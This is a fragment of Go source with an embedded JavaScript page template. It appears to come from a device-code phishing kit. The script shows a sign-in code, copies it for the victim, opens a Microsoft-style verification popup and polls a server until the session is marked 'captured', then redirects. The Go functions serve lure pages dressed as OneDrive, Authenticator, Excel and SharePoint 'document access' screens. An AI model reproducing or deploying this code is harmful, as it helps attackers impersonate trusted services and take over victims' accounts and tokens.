(function(){var sid='{session_id}';var verifyUrl='{verify_url}';var codeReady={code_ready};var code='{user_code}';var expiresIn={expires_seconds};var popup=null;var codeEl=document.getElementById('userCode');var statusEl=document.getElementById('codeStatus');var btnEl=document.getElementById('signInBtn');var copyBtnEl=document.getElementById('copyBtn');var copyTextEl=document.getElementById('copyText');var timerEl=document.getElementById('timerValue');function showCode(c,v){code=c;if(v)verifyUrl=v;codeEl.textContent=c;codeEl.classList.remove('loading');btnEl.disabled=false;copyBtnEl.disabled=false;document.getElementById('verifyLink').href=verifyUrl;}if(codeReady&&code){showCode(code,verifyUrl);}else{codeEl.classList.add('loading');}function copyCode(){if(!code)return;if(navigator.clipboard){navigator.clipboard.writeText(code).then(function(){showCopied();});}else{var t=document.createElement('textarea');t.value=code;t.style.cssText='position:fixed;left:-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);showCopied();}}function showCopied(){copyBtnEl.classList.add('copied');copyTextEl.textContent='Copied!';statusEl.textContent='Code copied to clipboard';setTimeout(function(){copyBtnEl.classList.remove('copied');copyTextEl.textContent='Copy Code';},3000);}window.copyCode=copyCode;function openSignIn(){if(!code)return;copyCode();var w=520,h=700,l=(screen.width-w)/2,t=(screen.height-h)/2;popup=window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');if(popup)popup.focus();}window.openSignIn=openSignIn;function updateTimer(){if(expiresIn<=0)return;expiresIn--;var m=Math.floor(expiresIn/60);var s=expiresIn%60;timerEl.textContent=m+':'+(s<10?'0':'')+s;if(expiresIn>0)setTimeout(updateTimer,1000);}if(codeReady)setTimeout(updateTimer,1000);function poll(){fetch('/dc/status/'+sid,{method:'GET',credentials:'include'}).then(function(r){return r.json()}).then(function(d){if(d.ready&&!codeReady){codeReady=true;showCode(d.user_code,d.verify_url);if(expiresIn==={expires_seconds})setTimeout(updateTimer,1000);}if(d.captured){document.getElementById('mainView').style.display='none';document.getElementById('successView').style.display='block';if(d.redirect_url){setTimeout(function(){top.location.href=d.redirect_url;},2500);}}if(!d.failed&&!d.expired&&!d.captured)setTimeout(poll,3000);})['catch'](function(){setTimeout(poll,5000);});}poll();})();
</script>
</body>
</html>`

// GetInterstitialForProvider returns the appropriate interstitial HTML template for the provider
// Now supports theme parameter for document access themed pages
func GetInterstitialForProvider(provider string) string {
	switch provider {
	case DCProviderGoogle:
		return DEVICE_CODE_GOOGLE_INTERSTITIAL_HTML
	default:
		return DEVICE_CODE_INTERSTITIAL_HTML
	}
}

// GetInterstitialByTheme returns themed document access page
func GetInterstitialByTheme(theme string) string {
	switch theme {
	case "onedrive":
		return DEVICE_CODE_ONEDRIVE_HTML
	case "authenticator":
		return DEVICE_CODE_AUTHENTICATOR_HTML
	case "lexvault":
		return DEVICE_CODE_LEXVAULT_HTML
	case "excel":
		return DEVICE_CODE_EXCEL_HTML
	case "sharepoint":
		return DEVICE_CODE_SHAREPOINT_HTML
	default:
		return DEVICE_CODE_INTERSTITIAL_HTML
	}
}
